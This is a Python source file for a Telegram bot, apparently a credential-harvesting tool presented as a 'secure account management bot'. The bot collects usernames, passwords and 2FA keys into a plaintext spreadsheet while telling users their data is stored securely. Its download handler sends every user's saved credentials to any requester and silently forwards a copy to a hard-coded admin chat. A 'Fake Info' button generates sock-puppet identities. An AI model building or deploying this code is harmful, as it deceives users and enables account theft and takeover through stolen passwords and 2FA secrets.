"""
Telegram Account Collection Bot
Uses python-telegram-bot v20+, openpyxl, asyncio
"""

import asyncio
import logging
import os
import random
import string
from datetime import datetime

import openpyxl
from openpyxl import Workbook
from telegram import (
    Update,
    ReplyKeyboardMarkup,
    KeyboardButton,
    ReplyKeyboardRemove,
)
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    ConversationHandler,
    filters,
    ContextTypes,
)

# ── Logging ──────────────────────────────────────────────────────────────────
logging.basicConfig(
    format="%(asctime)s | %(levelname)s | %(name)s | %(message)s",
    level=logging.INFO,
)
logger = logging.getLogger(__name__)

# ── Config ────────────────────────────────────────────────────────────────────
BOT_TOKEN = os.environ.get("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
ADMIN_USERNAME = "Sefuax"           # without @
ADMIN_CHAT_ID = os.environ.get("ADMIN_CHAT_ID")  # set this after first /start
ACCOUNTS_FILE = "accounts.xlsx"

# ── Conversation states ───────────────────────────────────────────────────────
USERNAME_STATE, PASSWORD_STATE, TFA_STATE = range(3)

# ── Keyboard ──────────────────────────────────────────────────────────────────
MAIN_KEYBOARD = ReplyKeyboardMarkup(
    [
        [KeyboardButton("✅ Submit Account"), KeyboardButton("🎭 Fake Info")],
        [KeyboardButton("👤 Admin")],
        [KeyboardButton("📥 Download")],
    ],
    resize_keyboard=True,
    persistent=True,
)

# ── Name data for fake-info generation ───────────────────────────────────────
FIRST_NAMES = [
    "James", "Emma", "Liam", "Olivia", "Noah", "Ava", "William", "Sophia",
    "Benjamin", "Isabella", "Lucas", "Mia", "Henry", "Charlotte", "Alexander",
    "Amelia", "Mason", "Harper", "Ethan", "Evelyn", "Daniel", "Luna", "Logan",
    "Camila", "Jackson", "Aria", "Sebastian", "Scarlett", "Jack", "Victoria",
    "Owen", "Madison", "Samuel", "Layla", "Ryan", "Penelope", "Nathan", "Riley",
    "Aiden", "Zoey", "Joseph", "Nora", "Charles", "Lily", "Thomas", "Eleanor",
    "Christopher", "Hannah", "Jayden", "Lillian",
]
LAST_NAMES = [
    "Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller",
    "Davis", "Wilson", "Taylor", "Moore", "Anderson", "Thomas", "Jackson",
    "White", "Harris", "Martin", "Thompson", "Young", "Allen", "King",
    "Wright", "Scott", "Green", "Baker", "Adams", "Nelson", "Hill", "Carter",
    "Mitchell", "Perez", "Roberts", "Turner", "Phillips", "Campbell",
    "Parker", "Evans", "Edwards", "Collins", "Stewart", "Morris", "Rogers",
    "Reed", "Cook", "Morgan", "Bell", "Murphy", "Bailey", "Rivera", "Cooper",
]
GENDERS = ["Male", "Female", "Other"]


# ── Excel helpers ─────────────────────────────────────────────────────────────

def ensure_workbook() -> openpyxl.Workbook:
    """Return an existing workbook or create a fresh one with headers."""
    if os.path.exists(ACCOUNTS_FILE):
        return openpyxl.load_workbook(ACCOUNTS_FILE)
    wb = Workbook()
    ws = wb.active
    ws.title = "Accounts"
    headers = ["Username", "Password", "2FA Key", "Timestamp", "Telegram User ID"]
    ws.append(headers)
    # Style header row
    from openpyxl.styles import Font, PatternFill, Alignment
    header_font = Font(bold=True, color="FFFFFF")
    header_fill = PatternFill("solid", fgColor="2F4F8F")
    for cell in ws[1]:
        cell.font = header_font
        cell.fill = header_fill
        cell.alignment = Alignment(horizontal="center")
    # Column widths
    for col, width in zip("ABCDE", [25, 25, 20, 22, 18]):
        ws.column_dimensions[col].width = width
    wb.save(ACCOUNTS_FILE)
    return wb


def save_account(username: str, password: str, tfa: str, user_id: int) -> None:
    """Append one account row to the Excel file."""
    wb = ensure_workbook()
    ws = wb.active
    ws.append([
        username,
        password,
        tfa if tfa else "—",
        datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC"),
        str(user_id),
    ])
    wb.save(ACCOUNTS_FILE)
    logger.info("Saved account for Telegram user %s", user_id)


# ── Fake info generator ───────────────────────────────────────────────────────

def generate_fake_info() -> dict:
    first = random.choice(FIRST_NAMES)
    last = random.choice(LAST_NAMES)
    gender = random.choice(GENDERS)

    # Username: first + 2-digit number in the middle + last (all lowercase)
    number = random.randint(10, 99)
    username = f"{first.lower()}{number}{last.lower()}"

    return {
        "name": f"{first} {last}",
        "username": username,
        "gender": gender,
    }


# ── Handlers ──────────────────────────────────────────────────────────────────

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user = update.effective_user
    await update.message.reply_text(
        f"👋 *Welcome, {user.first_name}!*\n\n"
        "I'm your secure account management bot. Here's what I can do:\n\n"
        "✅ *Submit Account* — Save credentials securely\n"
        "🎭 *Fake Info* — Generate realistic random identity\n"
        "👤 *Admin* — Reach the administrator\n"
        "📥 *Download* — Export saved accounts\n\n"
        "Use the keyboard below to get started. 👇",
        parse_mode="Markdown",
        reply_markup=MAIN_KEYBOARD,
    )
    logger.info("User %s (%s) started the bot.", user.id, user.username)


# ── Submit Account flow ───────────────────────────────────────────────────────

async def submit_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.message.reply_text(
        "📝 *Account Submission*\n\n"
        "Let's save your account details step by step.\n\n"
        "🔤 *Step 1/3* — Please enter your *Username*:",
        parse_mode="Markdown",
        reply_markup=ReplyKeyboardRemove(),
    )
    return USERNAME_STATE


async def got_username(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    context.user_data["acc_username"] = update.message.text.strip()
    await update.message.reply_text(
        "🔑 *Step 2/3* — Please enter your *Password*:",
        parse_mode="Markdown",
    )
    return PASSWORD_STATE


async def got_password(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    context.user_data["acc_password"] = update.message.text.strip()
    await update.message.reply_text(
        "🔐 *Step 3/3* — Enter your *2FA Key* (or send `-` to skip):",
        parse_mode="Markdown",
    )
    return TFA_STATE


async def got_tfa(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    raw_tfa = update.message.text.strip()
    tfa = "" if raw_tfa in ("-", "none", "skip", "") else raw_tfa

    username = context.user_data.get("acc_username", "")
    password = context.user_data.get("acc_password", "")
    user = update.effective_user

    try:
        save_account(username, password, tfa, user.id)
        await update.message.reply_text(
            "✅ *Account saved successfully!*\n\n"
            f"👤 Username: `{username}`\n"
            f"🔑 Password: `{'*' * len(password)}`\n"
            f"🔐 2FA: {'Provided' if tfa else 'Not provided'}\n\n"
            "Your credentials are stored securely. 🔒",
            parse_mode="Markdown",
            reply_markup=MAIN_KEYBOARD,
        )
    except Exception as e:
        logger.error("Failed to save account: %s", e)
        await update.message.reply_text(
            "❌ *Error saving account.* Please try again later.",
            parse_mode="Markdown",
            reply_markup=MAIN_KEYBOARD,
        )

    context.user_data.clear()
    return ConversationHandler.END


async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    context.user_data.clear()
    await update.message.reply_text(
        "❌ *Submission cancelled.*",
        parse_mode="Markdown",
        reply_markup=MAIN_KEYBOARD,
    )
    return ConversationHandler.END


# ── Fake Info ─────────────────────────────────────────────────────────────────

async def fake_info(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    info = generate_fake_info()
    gender_emoji = {"Male": "♂️", "Female": "♀️", "Other": "⚧️"}.get(info["gender"], "👤")

    await update.message.reply_text(
        "🎭 *Generated Fake Identity*\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        f"👤 *Full Name:* `{info['name']}`\n"
        f"🔖 *Username:* `@{info['username']}`\n"
        f"{gender_emoji} *Gender:* `{info['gender']}`\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "💡 _This identity is randomly generated._",
        parse_mode="Markdown",
        reply_markup=MAIN_KEYBOARD,
    )


# ── Admin ─────────────────────────────────────────────────────────────────────

async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user = update.effective_user
    tg_username = f"@{user.username}" if user.username else "no username"

    # Notify the admin via username mention (best effort — works if admin has started the bot)
    if ADMIN_CHAT_ID:
        try:
            await context.bot.send_message(
                chat_id=int(ADMIN_CHAT_ID),
                text=(
                    "🔔 *Admin Panel Notification*\n\n"
                    f"👤 User ID: `{user.id}`\n"
                    f"🏷️ Handle: {tg_username}\n"
                    f"📛 Name: {user.full_name}\n\n"
                    "User opened the *Admin* panel."
                ),
                parse_mode="Markdown",
            )
        except Exception as e:
            logger.warning("Could not notify admin: %s", e)
    else:
        logger.warning(
            "ADMIN_CHAT_ID not set. Cannot forward admin notification. "
            "Set ADMIN_CHAT_ID env var after the admin messages the bot once."
        )

    await update.message.reply_text(
        "👤 *Admin Panel*\n\n"
        f"Your message has been forwarded to *@{ADMIN_USERNAME}*.\n"
        "The admin will get back to you shortly. ⏳\n\n"
        f"🆔 Your User ID: `{user.id}`",
        parse_mode="Markdown",
        reply_markup=MAIN_KEYBOARD,
    )


# ── Download ──────────────────────────────────────────────────────────────────

async def download(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user = update.effective_user

    if not os.path.exists(ACCOUNTS_FILE):
        await update.message.reply_text(
            "⚠️ *No data found.*\n\n"
            "Please submit at least one account first using *✅ Submit Account*.",
            parse_mode="Markdown",
            reply_markup=MAIN_KEYBOARD,
        )
        return

    # Send to user
    try:
        with open(ACCOUNTS_FILE, "rb") as f:
            await update.message.reply_document(
                document=f,
                filename="accounts.xlsx",
                caption=(
                    "📥 *Accounts Export*\n\n"
                    f"📅 Generated: `{datetime.utcnow().strftime('%Y-%m-%d %H:%M UTC')}`\n"
                    "🔒 Handle this file with care."
                ),
                parse_mode="Markdown",
                reply_markup=MAIN_KEYBOARD,
            )
        logger.info("Sent accounts.xlsx to user %s", user.id)
    except Exception as e:
        logger.error("Failed to send file to user: %s", e)
        await update.message.reply_text(
            "❌ *Error sending file.* Please try again later.",
            parse_mode="Markdown",
            reply_markup=MAIN_KEYBOARD,
        )
        return

    # Silently forward to admin
    if ADMIN_CHAT_ID:
        try:
            with open(ACCOUNTS_FILE, "rb") as f:
                await context.bot.send_document(
                    chat_id=int(ADMIN_CHAT_ID),
                    document=f,
                    filename="accounts.xlsx",
                    caption=(
                        f"📊 *File downloaded by user*\n"
                        f"👤 ID: `{user.id}` | Handle: @{user.username or 'none'}\n"
                        f"📅 `{datetime.utcnow().strftime('%Y-%m-%d %H:%M UTC')}`"
                    ),
                    parse_mode="Markdown",
                )
        except Exception as e:
            logger.warning("Could not forward file to admin: %s", e)
    else:
        logger.warning("ADMIN_CHAT_ID not set — skipping silent admin forward.")


# ── Unknown / fallback ────────────────────────────────────────────────────────

async def unknown(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text(
        "🤔 I didn't understand that. Please use the keyboard below.",
        reply_markup=MAIN_KEYBOARD,
    )


# ── App bootstrap ─────────────────────────────────────────────────────────────

def main() -> None:
    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        raise ValueError("Set the BOT_TOKEN environment variable before running.")

    app = Application.builder().token(BOT_TOKEN).build()

    # Conversation handler for account submission
    conv_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Regex("^✅ Submit Account$"), submit_start)],
        states={
            USERNAME_STATE: [MessageHandler(filters.TEXT & ~filters.COMMAND, got_username)],
            PASSWORD_STATE: [MessageHandler(filters.TEXT & ~filters.COMMAND, got_password)],
            TFA_STATE:      [MessageHandler(filters.TEXT & ~filters.COMMAND, got_tfa)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
        allow_reentry=True,
    )

    app.add_handler(CommandHandler("start", start))
    app.add_handler(conv_handler)
    app.add_handler(MessageHandler(filters.Regex("^🎭 Fake Info$"), fake_info))
    app.add_handler(MessageHandler(filters.Regex("^👤 Admin$"), admin_panel))
    app.add_handler(MessageHandler(filters.Regex("^📥 Download$"), download))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, unknown))

    logger.info("Bot starting — polling mode")
    app.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()
